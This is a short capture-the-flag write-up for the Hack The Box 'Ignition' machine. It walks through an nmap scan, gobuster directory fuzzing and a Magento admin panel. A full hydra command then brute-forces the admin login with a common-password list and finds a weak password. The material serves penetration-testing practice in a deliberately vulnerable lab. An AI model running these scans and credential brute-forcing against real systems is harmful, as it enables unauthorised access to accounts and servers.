>[!tldr] Ignition is a very easy Linux machine that features basic enumeration of web applications and virtual host resolution. Upon enumerating open services, an #Nginx web server is discovered which requires local domain name resolution to be accessed properly. After enumerating the website and conducting directory fuzzing, a Magento admin panel can be found with weak credentials.

# Adventure Mode
---
1. Starting off with a `nmap` scan
	`nmap 10.129.1.27 -p- -sT --stats-every=5s`
	-> Port: `80`
	`nmap 10.129.1.27 -p80 -sCV`
```shell
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Did not follow redirect to http://ignition.htb/
|_http-server-header: nginx/1.14.2
```
2. We know about port 80 and that i should redirect to `http://ignition.htb/`. Ill throw that domain in with the machine ip to `/etc/hosts`.
3. Next i should check out the website and do more enumeration, so i decided to use `gobuster`.
	`gobuster dir -k -u http://ignition.htb/ -w Tools/SecLists-2026.1/Discovery/Web-Content/raft-large-directories.txt -x txt,php,html -t 40`
```shell
===============================================================
media                (Status: 301) [Size: 185] [--> http://ignition.htb/media/]
admin                (Status: 200) [Size: 7095]
contact              (Status: 200) [Size: 28673]
catalog              (Status: 302) [Size: 0] [--> http://ignition.htb/]
checkout             (Status: 302) [Size: 0] [--> http://ignition.htb/checkout/cart/]
home                 (Status: 200) [Size: 25802]
static               (Status: 301) [Size: 185] [--> http://ignition.htb/static/]
cms                  (Status: 200) [Size: 25817]
errors               (Status: 301) [Size: 185] [--> http://ignition.htb/errors/]
wishlist             (Status: 302) [Size: 0] [--> http://ignition.htb/customer/account/login/referer/aHR0cDovL2lnbml0aW9uLmh0Yi93aXNobGlzdA%2C%2C/]
index.php            (Status: 200) [Size: 25815]
setup                (Status: 301) [Size: 185] [--> http://ignition.htb/setup/]
Progress: 2337 / 249124 (0.94%)[ERROR] error on word list.txt: timeout occurred during the request
Home                 (Status: 301) [Size: 0] [--> http://ignition.htb/home]
<...snip...>
```
4. I decided to look at the admin page, and try the credentials `admin:admin` which i got the message 
	- `The account sign-in was incorrect or your account is disabled temporarily. Please wait and try again later.`
5. Now i should brute force the admin page, im going to use `hydra` since `ZAP` was taking too long
```shell
hydra ignition.htb -l admin -P Tools/SecLists-2026.1/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
        http-post-form "/admin/:form_key=Tcw4lOBA9h4MTa61&login[username]=^USER^&login[password]=^PASS^::H=Cookie\: admin=jlqajsad1kjdimj6v2ea8bisa3" \
        -t 40 -f -V4
```
- I got the password `qwerty123` and inside the admin page is the flag
	- Flag -> `[REDACTED_FLAG]`